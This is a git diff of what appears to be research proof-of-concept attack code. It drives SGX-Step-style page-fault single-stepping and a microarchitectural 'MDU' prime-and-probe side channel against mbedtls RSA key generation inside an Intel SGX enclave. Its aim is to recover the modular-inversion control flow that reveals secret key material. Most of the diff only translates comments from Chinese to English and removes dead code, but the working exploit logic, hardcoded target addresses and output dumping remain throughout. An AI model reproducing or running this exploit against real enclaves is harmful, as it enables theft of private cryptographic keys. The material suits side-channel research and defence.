@@ -61,7 +61,7 @@ extern "C" size_t stld_6(void* mem1, void* mem2);
 #include <vector>
 #include <emmintrin.h>
 
-// 用于同步的 page 地址
+// hooked page address, initialized in function attacker_config_page_table
 uint64_t *rsa_gen_key_4a_encl = NULL;
 uint64_t *rsa_gen_key_4b_encl = NULL;
 uint64_t *ctr_drbg_seed_encl = NULL;
@@ -76,31 +76,30 @@ uint64_t *mpi_shift_r_encl = NULL;
 uint64_t *mpi_add_sub_abs_encl = NULL;
 uint64_t *rbp_encl = NULL;
 
-// counter
-int fault_cnt = 0;
-int irq_ite = 0;
-int probe_ite = 0;
-#define ITE_BOUND 50000
-int x_loop_pass[ITE_BOUND];
-int sub_step_ground_truth[ITE_BOUND];
-size_t timestamp_sub_step_1_0[ITE_BOUND][30];
-size_t timestamp_sub_step_1_1[ITE_BOUND][30];
-size_t timestamp_sub_step_2_0[ITE_BOUND][30];
-size_t timestamp_sub_step_2_1[ITE_BOUND][30];
-size_t timestamp_sub_step_3_0[ITE_BOUND][30];
-size_t timestamp_sub_step_3_1[ITE_BOUND][30];
+#define ITE_BOUND 50000							// upbound of the interrupts
 
-// flag
-int touch_genkey = 0;	// 是否到达 genkey 函数
-int touch_invmod = 0;	// 是否从 genkey 内部到达 invmod 函数
+// counter
+int fault_cnt = 0;								// interrupt count
+int irq_ite = 0;								// hijack count
+int probe_ite = 0;								// MDU side channel count
+int x_loop_pass[ITE_BOUND];						// record u/v-loop ground truth
+int sub_step_ground_truth[ITE_BOUND];			// record sub-step ground truth
+size_t timestamp_sub_step_1_0[ITE_BOUND][30];	// record 1st load
+size_t timestamp_sub_step_1_1[ITE_BOUND][30];	// record 2nd load
+size_t timestamp_sub_step_2_0[ITE_BOUND][30];	// record 3rd load
+size_t timestamp_sub_step_2_1[ITE_BOUND][30];	// record 4th load
+size_t timestamp_sub_step_3_0[ITE_BOUND][30];	// record 5th load
+size_t timestamp_sub_step_3_1[ITE_BOUND][30];	// record 6th load
+
+// state flag
+int touch_genkey = 0;	// reach function genkey or not
+int touch_invmod = 0;	// reach function invmod or not
 int touch_branch = 0;	// 是否到达 branch
 int attack_finish = 0;	// 是否退出被攻击的 invmod 函数
 int prime_state = 0;    // 0: 不 prime；1: 第一次 prime；2: 第二次 prime；3: 第三次 prime
 int probe_state = 0;	// 0: 不 probe；1: 第一次 probe；2: 第二次 probe；3: 第三次 probe
 
-// #define OUTPUT_BREAK_NUM 2
-// uint64_t *output_encl[OUTPUT_BREAK_NUM] = {};
-
+// probe the MDU count
 int get_mdu_counte(size_t* timestamp) {
 	int edge_bound = 20;
 	// for(int i = 1; i < 30; ++ i) {
@@ -115,6 +114,7 @@ int get_mdu_counte(size_t* timestamp) {
 	return 15;
 }
 
+// reset page states
 void release_all_pages(void) {
 	*rsa_gen_key_4a_encl = MARK_EXECUTABLE(*rsa_gen_key_4a_encl);
 	*rsa_gen_key_4b_encl = MARK_EXECUTABLE(*rsa_gen_key_4b_encl);
@@ -130,6 +130,7 @@ void release_all_pages(void) {
 	*rbp_encl = MARK_WRITABLE(*rbp_encl);
 }
 
+// set page fault on a specific hijack point
 void break_rsa_gen_key_4a(void) {
 	release_all_pages();
 	*rsa_gen_key_4a_encl = MARK_NON_EXECUTABLE(*rsa_gen_key_4a_encl);
@@ -186,14 +187,11 @@ void break_shift_and_cmp (void) {
 	release_all_pages();
 	*mpi_shift_r_encl = MARK_NON_EXECUTABLE(*mpi_shift_r_encl);
 	*mpi_cmp_mpi_encl = MARK_NON_EXECUTABLE(*mpi_cmp_mpi_encl);
-	// *mpi_mod_mpi_encl = MARK_NON_EXECUTABLE(*mpi_mod_mpi_encl);
 }
 
 void break_add_sub (void) {
 	release_all_pages();
 	*mpi_add_sub_abs_encl = MARK_NON_EXECUTABLE(*mpi_add_sub_abs_encl);
-	// *mpi_inv_mod_encl = MARK_NON_EXECUTABLE(*mpi_inv_mod_encl);
-	// *mpi_mod_mpi_encl = MARK_NON_EXECUTABLE(*mpi_mod_mpi_encl);
 }
 
 void break_rbp_write (void) {
@@ -201,19 +199,16 @@ void break_rbp_write (void) {
 	*rbp_encl =  MARK_NON_WRITABLE(*rbp_encl);
 }
 
-void aep_cb_func(void){
+void aep_cb_func(void) {
+	// get hooked page
     uint64_t erip = edbgrd_erip() - (uint64_t)get_enclave_base();
-	// uint64_t erbp = edbgrd_ssa_gprsgx(40);
-    // printf("[%d] erip = 0x%lx, rbp = 0x%lx\n", irq_ite, erip, erbp);
 	// printf("[%d] erip = 0x%lx\n", irq_ite, erip);
 	irq_ite ++;
 
 	if (attack_finish == 1) {
-		// break_rsa_gen_key_4a();
-		// break_inv_mod();
 		goto state_output;
 	}
-	// 到达 rsa_gen_key 之前
+	// before reaching function rsa_gen_key
 	else if (touch_genkey == 0) {
 		if (irq_ite % 2 == 1) {
 			break_ctr_drbg_seed();
@@ -225,11 +220,11 @@ void aep_cb_func(void){
 		}
 		return;
 	}
-	// 到达 rsa_gen_key 之后，到达 inv_mod_mpi 中的 x-loop 之前
+	// after reaching rsa_gen_key, and before reaching function u/v-loop inside function inv_mod
 	else if (touch_genkey == 1 && touch_invmod == 0) {
 		if(irq_ite >= 1 && irq_ite < 4) {
 			if (irq_ite % 2 == 1) {
-				break_gen_prime();  // gen_prime
+				break_gen_prime(); 
 			}
 			else {
 				break_rsa_gen_key_4a();
@@ -261,22 +256,22 @@ void aep_cb_func(void){
 		}
 		return;
 	}
-	// 进入 x-loop 后，到达 sub-step 之前
+	// entering u/v-loop, and before reaching sub-step
 	else if (touch_invmod == 1 && touch_branch == 0) {
 		if (irq_ite % 2 == 0) {
 			if ((erip & 0xfff) == 0x953 || (erip & 0xfff) == 0xc46) {
-				// 完成一次 u-loop 
+				// u-loop 
 				x_loop_pass[probe_ite] += 1;
 				break_shift_and_cmp();
 			}
 			else {
+				// v-loop
 				break_shift_and_cmp();
 			}
 		}
 		else{
 			if ((erip & 0xfff) == 0xf40) {
-				// 进入 sub-step
-				// printf("Touch Sub-step!\n");
+				// exit u/v-loop
 				touch_branch = 1;
 				irq_ite = 0;
 				prime_state = 0;
@@ -285,7 +280,7 @@ void aep_cb_func(void){
 		}
 		return;
 	}
-	// touch sub-step
+	// reaching sub-step
 	else {
 		if (irq_ite % 2 == 0) {
 			if (touch_branch == -1) {
@@ -297,22 +292,23 @@ void aep_cb_func(void){
 			}
 		}
 		else {
-			if (touch_branch == 1 && (erip & 0xfff) == 0x180) {  // 到达 mbedtls_mpi_cmp_int，说明退出了 sub-step
-				// printf("Jump out of sup-step!\n");
+			if (touch_branch == 1 && (erip & 0xfff) == 0x180) {
+				// reaching function cmp_int, exit sub-step
 				touch_branch = -1;
 			}
 			else if (touch_branch == -1 && (erip & 0xfff) == 0x180) {
-				// printf("Jump out of inv mod!\n");
+				// exit function inv_mod
 				touch_branch = 0;
 				attack_finish = 1;
 			}
-			else if (touch_branch == -1 && (erip & 0xfff) == 0x67e) {  // 重新回到 x-loop
+			else if (touch_branch == -1 && (erip & 0xfff) == 0x67e) {
+				// go back to u/v-loop
 				touch_branch = 0;
 				probe_ite ++;
 			}
 			break_inv_mod();
 		}
-		// 设置 prime 和 probe 标记
+		// set prime or probe state flag
 		if (prime_state == 1) {
 			probe_state = 1;
 			prime_state = 0;
@@ -326,7 +322,7 @@ void aep_cb_func(void){
 			prime_state = 0;
 		}
 		if (irq_ite == 4) {
-			// 第一个 mpi_sub_mpi 函数执行完毕，准备更新 MDU
+			// first attack round
 			if ((erip & 0xfff) == 0x2d1) {
 				sub_step_ground_truth[probe_ite] = 1;
 			}
@@ -336,14 +332,14 @@ void aep_cb_func(void){
 			prime_state = 1;
 		}
 		else if (irq_ite == 6) {
-			// 第二个 mpi_sub_mpi 函数执行完毕，准备更新 MDU
+			// second attack round
 			prime_state = 2;
 		}
 		else if (irq_ite == 8) {
-			// 第三个 mpi_sub_mpi 函数执行完毕，准备更新 MDU
+			// third attack round
 			prime_state = 3;
 		}
-		// 执行 MDU 侧信道
+		// MDU side channel
 		switch (prime_state)
 		{
 			case 0:
@@ -352,7 +348,6 @@ void aep_cb_func(void){
 
 			case 1: {
 				int A[10];
-				// printf("Prime for the 1st time!\n");
 				for (int i = 0; i < 300; ++ i) {
 					stld_1(&A[0], &A[8]);
 					stld_2(&A[0], &A[8]);
@@ -361,7 +356,6 @@ void aep_cb_func(void){
 					stld_1(&A[0], &A[0]);
 					stld_2(&A[0], &A[0]);
 				}
-				// _mm_clflush((void*)0x7ffff65fb330);
 				break;
 			}
 
@@ -436,8 +430,8 @@ void aep_cb_func(void){
 	}
 
 state_output:
-	// The code below use erip to synchronize, we can use Copycat instead in SGX release mode 
-	if (attack_finish) {  // inv mod finish
+	// dump output
+	if (attack_finish) { 
 		release_all_pages();
 		printf("X-loop-ground-truth:\n");
 		for(int i = 0; i <= probe_ite; ++ i) {
@@ -478,14 +472,14 @@ state_output:
 
 
 
-/* Called upon SIGSEGV caused by untrusted page tables. */
+// Called upon SIGSEGV caused by untrusted page tables
 namespace {
 	void fault_handler(int signal, siginfo_t *info, void *_context) {
 		release_all_pages();
 	}
 }
 
-/* Configure and check attacker untrusted runtime environment. */
+// Configure and check attacker untrusted runtime environment
 void attacker_config_runtime(void) {
     ASSERT( !claim_cpu(VICTIM_CPU) );
 	struct sigaction sigbreak;
@@ -499,8 +493,8 @@ void attacker_config_runtime(void) {
 	printf("attacker_config_runtime finished\n");
 }
 
-/* Provoke page fault on enclave entry to initiate single-stepping mode. */
-void attacker_config_page_table(void){
+// Provoke page fault on enclave entry to initiate single-stepping mode
+void attacker_config_page_table(void) {
 
 	uint64_t addr_mbedtls_rsa_gen_key_4a = 0x7ffff504adf0;
 	uint64_t addr_mbedtls_rsa_gen_key_4b = 0x7ffff504b000;
@@ -543,7 +537,7 @@ void attacker_config_page_table(void){
 #include "App.h"
 #include "Enclave_u.h"
 
-/* Global EID shared by multiple threads */
+// Global EID shared by multiple threads
 sgx_enclave_id_t global_eid = 0;
 
 typedef struct _sgx_errlist_t {
@@ -552,7 +546,7 @@ typedef struct _sgx_errlist_t {
     const char *sug; /* Suggestion */
 } sgx_errlist_t;
 
-/* Error code returned by sgx_create_enclave */
+// Error code returned by sgx_create_enclave
 static sgx_errlist_t sgx_errlist[] = {
     {
         SGX_ERROR_UNEXPECTED,
@@ -641,9 +635,8 @@ static sgx_errlist_t sgx_errlist[] = {
     },
 };
 
-/* Check error conditions for loading enclave */
-void print_error_message(sgx_status_t ret)
-{
+// Check error conditions for loading enclave
+void print_error_message(sgx_status_t ret) {
     size_t idx = 0;
     size_t ttl = sizeof sgx_errlist/sizeof sgx_errlist[0];
 
@@ -660,15 +653,10 @@ void print_error_message(sgx_status_t ret)
         printf("Error: Unexpected error occurred.\n");
 }
 
-/* Initialize the enclave:
- *   Call sgx_create_enclave to initialize an enclave instance
- */
-int initialize_enclave(void)
-{
+// Initialize the enclave
+int initialize_enclave(void) {
     sgx_status_t ret = SGX_ERROR_UNEXPECTED;
     
-    /* Call sgx_create_enclave to initialize an enclave instance */
-    /* Debug Support: set 2nd parameter to 1 */
     ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &global_eid, NULL);
     if (ret != SGX_SUCCESS) {
         print_error_message(ret);
@@ -678,24 +666,18 @@ int initialize_enclave(void)
     return 0;
 }
 
-/* OCall functions */
-void ocall_print_string(const char *str)
-{
-    /* Proxy/Bridge will check the length and null-terminate 
-     * the input string to prevent buffer overflow. 
-     */
+// OCall functions
+void ocall_print_string(const char *str) {
     printf("%s", str);
 }
 
 
-/* Application entry */
-int SGX_CDECL main(int argc, char *argv[])
-{
+// Application entry
+int SGX_CDECL main(int argc, char *argv[]) {
     (void)(argc);
     (void)(argv);
     int result = 0xff;
 
-    /* Initialize the enclave */
     if(initialize_enclave() < 0){
         printf("Enter a character before exit ...\n");
         getchar();
@@ -712,6 +694,7 @@ int SGX_CDECL main(int argc, char *argv[])
 	attacker_config_page_table();
     apic_timer_oneshot(IRQ_VECTOR);
 
+	// RSA key generation
     sgx_status_t status = ecall_mbedtls_crypto(global_eid, &result);
     if (status != SGX_SUCCESS) {
 	    printf("ERROR: ECall failed\n");
@@ -721,7 +704,6 @@ int SGX_CDECL main(int argc, char *argv[])
 	    return -1;
     }
 
-    /* Destroy the enclave */
     sgx_destroy_enclave(global_eid);
     
     printf("Info: MbedCrypto Sample completed.\n");
@@ -733,8 +715,7 @@ int SGX_CDECL main(int argc, char *argv[])
         if ( result & FAIL_AES ) printf("ERROR: AES-CTR test failed.\n");
         if ( result & FAIL_ECDSA ) printf("ERROR: ECDSA test failed.\n");
     }
-    // printf("Enter a character before exit ...\n");
-    // getchar();
+
     return 0;
 }
 
